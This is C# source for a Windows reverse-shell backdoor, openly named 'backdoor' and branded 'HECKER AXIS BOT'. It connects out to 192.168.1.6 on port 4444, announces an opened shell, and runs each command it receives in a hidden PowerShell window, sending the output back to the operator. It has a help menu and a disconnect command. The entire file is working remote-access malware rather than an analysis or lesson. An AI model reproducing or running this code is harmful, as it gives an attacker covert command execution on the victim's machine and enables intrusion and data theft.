using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

class backdoor
{
    static Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    static void Main()
    {
        connect_backdoor("192.168.1.6", 4444);
    }
    static void connect_backdoor(string ip, int port)
    {
        string banner = "+==================+HECKER AXIS BOT+==================+\n";
        string main = "HELP MENU :-\n";
        string help =
        "======================================================================================================\n" +
        "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++||\n" +
        "|| Terminal Commands ||---> All termianl commands are same.                                       ||\n" +
        "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++||\n" +
        "[SOME SPECIAL COMMANDS] Note:-More commands will be added.                                        ||\n" +
        "||dis                ||---> To disconnect.                                                        ||\n" +
        "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++||\n" +
        "||CREDITS            ||---> THIS BOT IS MADE BY 'HECKER(ME)'.                                     ||\n" +
        "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++||\n" +
        "======================================================================================================\n";
        string helpp = banner + main + help;
        s.Connect(ip, port);
        string mess = "  \n";
        string message = "You are now ready to exploit the client :-)\nHackerrr goes brrrrrrr \n";
        string mess1 = "\n";
        string shell = "[+] Shell Opened!! \n \n";
        string fi = mess + message + mess1 + shell;
        s.Send(Encoding.UTF8.GetBytes(fi));
        s.Send(Encoding.UTF8.GetBytes(helpp));

        while (true)
        {
            string suffix = "\n[*] SESSION >> ";
            byte[] suff = Encoding.UTF8.GetBytes(suffix);
            s.Send(suff);

            byte[] buffer = new byte[1024];
            int iRx = s.Receive(buffer);
            char[] chars = new char[iRx];
            System.Text.Decoder d = System.Text.Encoding.UTF8.GetDecoder();
            int charLen = d.GetChars(buffer, 0, iRx, chars, 0);
            System.String recv = new System.String(chars);
            if (recv[..3] == "cd ")
            {
                string start = "cd ";
                char[] m = start.ToCharArray();
                string end = " \n";
                char[] m2 = end.ToCharArray();
                string path = recv.TrimStart(m).TrimEnd(m2);
                try
                {
                    Directory.SetCurrentDirectory(path);
                    string direc = "Directory changed to: " + Directory.GetCurrentDirectory();
                    s.Send(Encoding.UTF8.GetBytes(direc));
                }
                catch (Exception ex)
                {
                    ex.Message.ToString();
                    s.Send(Encoding.UTF8.GetBytes(ex.Message));
                }
            }
            else if (recv[..3] == "dis")
            {
                string exit_message = "Bye...Hecker, Hope we will meet again :)";
                s.Send(Encoding.UTF8.GetBytes(exit_message));
                s.Close();
                break;
            }
            else if (recv == "help")
            {
                s.Send(Encoding.UTF8.GetBytes(help));
            }
            else
            {
                try
                {
                    Process process = new Process();
                    process.StartInfo.FileName = "powershell.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.Arguments = recv;
                    process.Start();
                    process.StandardInput.WriteLine(recv);
                    process.StandardInput.Flush();
                    process.StandardInput.Close();
                    string output = process.StandardOutput.ReadToEnd();
                    s.Send(Encoding.ASCII.GetBytes(output));
                }
                catch (Exception ex)
                {
                    string error = ex.ToString();
                    s.Send(Encoding.ASCII.GetBytes(error));
                }
            }
        }
    }
}
